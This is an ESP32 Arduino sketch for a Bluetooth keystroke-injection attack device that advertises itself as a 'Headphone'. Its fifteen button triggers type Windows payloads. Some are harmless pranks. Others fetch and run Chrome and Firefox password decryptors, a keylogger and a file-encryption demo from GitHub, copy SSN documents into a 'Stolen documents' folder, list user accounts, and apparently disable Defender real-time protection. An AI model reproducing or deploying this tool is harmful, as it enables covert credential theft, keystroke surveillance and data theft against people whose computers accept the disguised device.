#include <BleKeyboard.h>

#define BUTTON_1_PIN 16 // Button 1 (Trigger: Rickroll)
#define BUTTON_2_PIN 17 // Button 2 (Trigger: System Info)
#define BUTTON_3_PIN 18 // Button 3 (Trigger: Windows Lock + Notepad Message)
#define BUTTON_4_PIN 19 // Button 4 (Trigger: Decrypt Chrome Passwords)
#define BUTTON_5_PIN 21 // Button 5 (Trigger: Task Manager Admin)
#define BUTTON_6_PIN 22 // Button 6 (Trigger: Calculator)
#define BUTTON_7_PIN 23 // Button 7 (Trigger: Virus & Threat Protection)
#define BUTTON_8_PIN 25 // Button 8 (Trigger: Firefox Decrypt)
#define BUTTON_9_PIN 26 // Button 9 (Trigger: Copy Files Payload)
#define BUTTON_10_PIN 27 // Button 10 (Trigger: Notepad Message + Save)
#define BUTTON_11_PIN 32 // Button 11 (Trigger: Net User Command)
#define BUTTON_12_PIN 33 // Button 12 (Trigger: Open 5 Notepads)
#define BUTTON_13_PIN 14 // Button 13 (Trigger: Open 5 CMDs)
#define BUTTON_14_PIN 12 // Button 14 (Trigger: Keylogger)
#define BUTTON_15_PIN 13 // Button 15 (Trigger: File Encryption Demo)

char kbd[] = "Headphone"; // Device Name
BleKeyboard bleKeyboard(kbd, "Espressif", 100);

bool lastState1 = HIGH;
bool lastState2 = HIGH;
bool lastState3 = HIGH;
bool lastState4 = HIGH;
bool lastState5 = HIGH;
bool lastState6 = HIGH;
bool lastState7 = HIGH;
bool lastState8 = HIGH;
bool lastState9 = HIGH;
bool lastState10 = HIGH;
bool lastState11 = HIGH;
bool lastState12 = HIGH;
bool lastState13 = HIGH;
bool lastState14 = HIGH;
bool lastState15 = HIGH;

void sendString(const char* s, int charDelay = 10) {
  for (size_t i = 0; i < strlen(s); i++) {
    bleKeyboard.print(s[i]);
    delay(charDelay);
  }
}

void openRun() {
  bleKeyboard.press(KEY_LEFT_GUI);
  bleKeyboard.press('r');
  delay(100);
  bleKeyboard.releaseAll();
  delay(300);
}

void setup() {
  Serial.begin(115200);
  Serial.println("Starting BLE HID setup with 15 Triggers on Buttons 1-15 (Pins 16, 17, 18, 19, 21, 22, 23, 25, 26, 27, 32, 33, 14, 12, 13)...");

  pinMode(BUTTON_1_PIN, INPUT_PULLUP);
  pinMode(BUTTON_2_PIN, INPUT_PULLUP);
  pinMode(BUTTON_3_PIN, INPUT_PULLUP);
  pinMode(BUTTON_4_PIN, INPUT_PULLUP);
  pinMode(BUTTON_5_PIN, INPUT_PULLUP);
  pinMode(BUTTON_6_PIN, INPUT_PULLUP);
  pinMode(BUTTON_7_PIN, INPUT_PULLUP);
  pinMode(BUTTON_8_PIN, INPUT_PULLUP);
  pinMode(BUTTON_9_PIN, INPUT_PULLUP);
  pinMode(BUTTON_10_PIN, INPUT_PULLUP);
  pinMode(BUTTON_11_PIN, INPUT_PULLUP);
  pinMode(BUTTON_12_PIN, INPUT_PULLUP);
  pinMode(BUTTON_13_PIN, INPUT_PULLUP);
  pinMode(BUTTON_14_PIN, INPUT_PULLUP);
  pinMode(BUTTON_15_PIN, INPUT_PULLUP);

  Serial.println("Initializing BLE...");
  delay(1000);
  bleKeyboard.begin();
  Serial.println("BLE ready. Connect as 'Headphone'.");
}

void loop() {
  if (bleKeyboard.isConnected()) {
    bool state1 = digitalRead(BUTTON_1_PIN);
    bool state2 = digitalRead(BUTTON_2_PIN);
    bool state3 = digitalRead(BUTTON_3_PIN);
    bool state4 = digitalRead(BUTTON_4_PIN);
    bool state5 = digitalRead(BUTTON_5_PIN);
    bool state6 = digitalRead(BUTTON_6_PIN);
    bool state7 = digitalRead(BUTTON_7_PIN);
    bool state8 = digitalRead(BUTTON_8_PIN);
    bool state9 = digitalRead(BUTTON_9_PIN);
    bool state10 = digitalRead(BUTTON_10_PIN);
    bool state11 = digitalRead(BUTTON_11_PIN);
    bool state12 = digitalRead(BUTTON_12_PIN);
    bool state13 = digitalRead(BUTTON_13_PIN);
    bool state14 = digitalRead(BUTTON_14_PIN);
    bool state15 = digitalRead(BUTTON_15_PIN);

    // Button 1: Rickroll (Pin 16)
    if (lastState1 == HIGH && state1 == LOW) {
      Serial.println("Button 1: Rickroll (Pin 16)");
      openRun(); delay(700); 
      const char* url = "https://youtube.com/shorts/SXHMnicI6Pg?si=uX7jga76jFQsKcYo"; 
      sendString(url, 10); delay(300); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
    }

    // Button 2: System Info (Pin 17)
    if (lastState2 == HIGH && state2 == LOW) {
      Serial.println("Button 2: System Info (Pin 17)");
      openRun(); delay(300); 
      sendString("cmd"); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(300); 
      bleKeyboard.releaseAll(); delay(700);
      sendString("systeminfo", 10); delay(200); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
    }

    // Button 3: Windows Lock + Notepad Message (Pin 18)
    if (lastState3 == HIGH && state3 == LOW) {
      Serial.println("Button 3: Windows Lock + Notepad Message (Pin 18)");
      bleKeyboard.press(KEY_LEFT_GUI); 
      bleKeyboard.press('l'); 
      delay(100); 
      bleKeyboard.releaseAll(); delay(2000);
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
      sendString("sachin", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(500);
      openRun(); delay(300); 
      sendString("notepad"); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
      sendString("This is bluetooth usb rubber ducky script is started on your computer system", 10); 
      delay(500);
    }

    // Button 4: Decrypt Chrome Passwords (Pin 19)
    if (lastState4 == HIGH && state4 == LOW) {
      Serial.println("Button 4: Decrypt Chrome Passwords (Pin 19)");
      openRun(); delay(300); 
      sendString("powershell"); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(300); 
      bleKeyboard.releaseAll(); delay(7000);
      sendString("git clone https://github.com/ohyicong/decrypt-chrome-passwords.git", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(7000);
      sendString("ls", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(3000);
      sendString("cd decrypt-chrome-passwords", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(3000);
      sendString("python decrypt_chrome_password.py", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(3000);
    }

    // Button 5: Task Manager Admin (Pin 21)
    if (lastState5 == HIGH && state5 == LOW) {
      Serial.println("Button 5: Task Manager Admin (Pin 21)");
      openRun(); delay(300); 
      sendString("taskmgr"); delay(100); 
      bleKeyboard.press(KEY_LEFT_CTRL); 
      bleKeyboard.press(KEY_LEFT_SHIFT); 
      bleKeyboard.press(KEY_RETURN); 
      delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
      bleKeyboard.press(KEY_LEFT_ARROW); delay(100); 
      bleKeyboard.releaseAll(); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(500);
    }

    // Button 6: Calculator (Pin 22)
    if (lastState6 == HIGH && state6 == LOW) {
      Serial.println("Button 6: Calculator (Pin 22)");
      openRun(); delay(300); 
      sendString("calc"); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
    }

    // Button 7: Virus & Threat Protection (Pin 23)
    if (lastState7 == HIGH && state7 == LOW) {
      Serial.println("Button 7: Virus & Threat Protection (Pin 23)");
      bleKeyboard.press(KEY_LEFT_GUI); delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
      sendString("virus & threat protection", 10); delay(1000);
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(2000);
      bleKeyboard.press(KEY_TAB); delay(500); 
      bleKeyboard.releaseAll();
      bleKeyboard.press(KEY_TAB); delay(500); 
      bleKeyboard.releaseAll();
      bleKeyboard.press(KEY_TAB); delay(500); 
      bleKeyboard.releaseAll();
      bleKeyboard.press(KEY_TAB); delay(500); 
      bleKeyboard.releaseAll();
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(500);
      bleKeyboard.press(KEY_SPACE); delay(100); 
      bleKeyboard.releaseAll(); delay(500);
      bleKeyboard.press(KEY_LEFT_ARROW); delay(100); 
      bleKeyboard.releaseAll(); delay(500);
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(500);
    }

    // Button 8: Firefox Decrypt (Pin 25)
    if (lastState8 == HIGH && state8 == LOW) {
      Serial.println("Button 8: Firefox Decrypt (Pin 25)");
      bleKeyboard.press(KEY_LEFT_GUI); delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
      sendString("powershell", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(7000);
      sendString("git clone https://github.com/unode/firefox_decrypt.git", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(7000);
      sendString("cd firefox_decrypt", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(3000);
      sendString("python firefox_decrypt.py", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(3000);
      sendString("2", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
    }

    // Button 9: Copy Files Payload (Pin 26)
    if (lastState9 == HIGH && state9 == LOW) {
      Serial.println("Button 9: Copy Files Payload (Pin 26)");
      openRun(); delay(1000); 
      sendString("cmd", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(1500);
      sendString("mkdir \"C:\\Users\\Dell\\Pictures\\Screenshots\\OneDrive\\Desktop\\Stolen documents\"", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
      sendString("xcopy \"C:\\Users\\Dell\\Documents\\Hello\\SSN\\*\" \"C:\\Users\\Dell\\Pictures\\Screenshots\\OneDrive\\Desktop\\Stolen documents\\\" /E /I /Y", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
      Serial.println("Copy Files Payload executed");
    }

    // Button 10: Notepad Message + Save (Pin 27)
    if (lastState10 == HIGH && state10 == LOW) {
      Serial.println("Button 10: Notepad Message + Save (Pin 27)");
      openRun(); delay(1000); 
      sendString("notepad", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
      sendString("Hello! This is automated typing using BLE HID.", 10); delay(500);
      bleKeyboard.press(KEY_LEFT_ALT); 
      bleKeyboard.press('f'); 
      delay(100); 
      bleKeyboard.releaseAll(); delay(100);
      bleKeyboard.press('x'); 
      delay(100); 
      bleKeyboard.releaseAll(); delay(500);
      Serial.println("Notepad Message + Save executed");
    }

    // Button 11: Net User Command (Pin 32)
    if (lastState11 == HIGH && state11 == LOW) {
      Serial.println("Button 11: Net User Command (Pin 32)");
      openRun(); delay(1000); 
      sendString("cmd", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(1500);
      sendString("net user", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(5000);
      sendString("exit", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(500);
      Serial.println("Net User Command executed");
    }

    // Button 12: Open 5 Notepads (Pin 33)
    if (lastState12 == HIGH && state12 == LOW) {
      Serial.println("Button 12: Open 5 Notepads (Pin 33)");
      for (int i = 0; i < 5; i++) {
        openRun(); delay(1000); 
        sendString("notepad", 10); delay(100); 
        bleKeyboard.press(KEY_RETURN); delay(100); 
        bleKeyboard.releaseAll(); delay(1000);
      }
      Serial.println("Open 5 Notepads executed");
    }

    // Button 13: Open 5 CMDs (Pin 14)
    if (lastState13 == HIGH && state13 == LOW) {
      Serial.println("Button 13: Open 5 CMDs (Pin 14)");
      for (int i = 0; i < 5; i++) {
        openRun(); delay(1000); 
        sendString("cmd", 10); delay(100); 
        bleKeyboard.press(KEY_RETURN); delay(100); 
        bleKeyboard.releaseAll(); delay(1000);
      }
      Serial.println("Open 5 CMDs executed");
    }

    // Button 14: Keylogger (Pin 12)
    if (lastState14 == HIGH && state14 == LOW) {
      Serial.println("Button 14: Keylogger (Pin 12)");
      bleKeyboard.press(KEY_LEFT_GUI); delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
      sendString("powershell", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(7000);
      sendString("git clone https://github.com/sachinpandey7709/Keylogger.git", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(7000);
      sendString("cd Keylogger", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(3000);
      sendString("python keylogger.py", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(3000);
      Serial.println("Keylogger Payload executed");
    }

    // Button 15: File Encryption Demo (Pin 13)
    if (lastState15 == HIGH && state15 == LOW) {
      Serial.println("Button 15: File Encryption Demo (Pin 13)");
      bleKeyboard.press(KEY_LEFT_GUI); delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
      sendString("powershell", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(7000);
      sendString("git clone https://github.com/sachinpandey7709/File-Encryption-Awareness-Project-Ethical-Demo-.git", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(7000);
      sendString("cd File-Encryption-Awareness-Project-Ethical-Demo-", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(3000);
      sendString("python code.py", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(3000);
      Serial.println("File Encryption Demo Payload executed");
    }

    lastState1 = state1;
    lastState2 = state2;
    lastState3 = state3;
    lastState4 = state4;
    lastState5 = state5;
    lastState6 = state6;
    lastState7 = state7;
    lastState8 = state8;
    lastState9 = state9;
    lastState10 = state10;
    lastState11 = state11;
    lastState12 = state12;
    lastState13 = state13;
    lastState14 = state14;
    lastState15 = state15;
  } else {
    Serial.println("Waiting for BLE connection...");
  }
  delay(50); // Debounce/stability
}
